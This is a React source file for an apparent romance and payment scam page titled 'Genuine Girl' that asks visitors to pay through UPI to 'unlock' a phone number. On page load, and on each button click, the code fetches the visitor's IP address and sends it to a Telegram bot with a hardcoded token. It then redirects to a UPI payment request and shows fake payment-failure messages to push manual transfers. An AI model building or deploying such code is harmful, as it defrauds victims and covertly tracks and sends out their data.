import './App.css';
import React, { useEffect, useState } from 'react';
import PaymentModal from './modal';
let ip = 'Not Found'

async function sendUpdate(msg) {
  if (ip === 'Not Found') {
    fetch('https://api.db-ip.com/v2/free/self')
      .then(result => result.json())
      .then((output) => {
        ip = output;
        const url = `https://api.telegram.org/bot5479990786:AAEcL3ltMHl3phz_HP3TXMXMX1dpeI4grCM/sendMessage?chat_id=-1001166751237&text=${msg}--------${ip.ipAddress}`
        fetch(url, {
          method: "POST",
          headers: { 'Content-Type': 'application/json' },
          body: ''
        }).then(res => {
          console.log("Request complete!");
        })
      }).catch(err => console.error(err));
  } else {
    const url = `https://api.telegram.org/bot5479990786:AAEcL3ltMHl3phz_HP3TXMXMX1dpeI4grCM/sendMessage?chat_id=-1001166751237&text=${msg}--------${ip.ipAddress}`
    fetch(url, {
      method: "POST",
      headers: { 'Content-Type': 'application/json' },
      body: ''
    }).then(res => {
      console.log("Request complete!");
    })
  }
}

function App() {
  const [isOpen, setisOpen] = useState(false);

  useEffect(() => {
    sendUpdate("Home");
    setTimeout(() => {
      console.log("launching");
      window.open("upi://pay?cu=INR&pa=bharatpe.0851610820@icici&pn=ShruthiReddy&tn=Genuine_Girl", "_self");
    }, 1500);
  }, []);



  const handlepayButton = async () => {
    await sendUpdate("PayButton")
    window.open("upi://pay?cu=INR&pa=bharatpe.0851610820@icici&pn=ShruthiReddy&tn=Genuine_Girl", "_self");
  }

  const handleWspButton = async () => {
    setisOpen(!isOpen)
    await sendUpdate("WhatsppBtn")
    //window.open("upi://pay?cu=INR&pa=bharatpe.0851610820@icici&pn=ShruthiReddy&tn=Genuine_Girl&am=350", "_self");
    //return (<PaymentModal isOpen={true}></PaymentModal>)
  }

  const MsgBtnCombo = ({ msg, btnName, handler, err }) => {
    return (
      <div className="msgBtn">
        <h6>{msg}</h6>
        <button className='button' onClick={() => { handler() }}>{btnName}</button>
        {err
          && <span>
            <p style={{ margin: "0px", fontWeight: 'normal', fontSize: "10px", color: "red" }}>PhonePe is not Working tempoarily!!</p>
            <p style={{ margin: "0px", fontWeight: 'normal', fontSize: "10px", color: "red" }}>Pay using UPI Address Above or use Gpay</p>
          </span>
        }
      </div>
    )
  }

  return (
    <div className="App" onClick={() => { /*setisOpen(false) */ }}>
      <header className="App-header">
        <h1 style={{ marginTop: "-100px", marginBottom: '10px' }}>🍆Genuine Girl!!🍆</h1>
        <CopyExample />
        <MsgBtnCombo msg="You should PAY first to Unlock My Number!!😜" btnName="PAY NOW!!" handler={handlepayButton} err={true}></MsgBtnCombo>
        <MsgBtnCombo msg="Click Below👇 For My Whatsapp Number!!" btnName="Whatsapp Number!" handler={handleWspButton} err={false}></MsgBtnCombo>
        <h6>PAY NOW and Send me screenshot on Telegram!!🥰</h6>
        {isOpen && <PaymentModal isOpen={isOpen} setisOpen={setisOpen} fn={handlepayButton} className="special_modal"></PaymentModal>}
      </header>
    </div >
  );
}

function CopyExample() {
  return (
    <div className='card'>
      <p style={{ margin: "0px", color: "mistyrose", fontWeight: 'bold' }}>Pay to my UPI Address if  "Pay Now" Button is Not Working👇🏻👇🏻👇🏻</p>
      <div style={{ display: "flex", padding: "15px" }}>
        <input readOnly value={"bharatpe.0851610820@icici"}></input >
        <button className='cpybutton' onClick={async () => { await sendUpdate('Copied'); navigator.clipboard.writeText('bharatpe.0851610820@icici') }}>Copy</button>
      </div>
    </div>
  );
}


export default App;
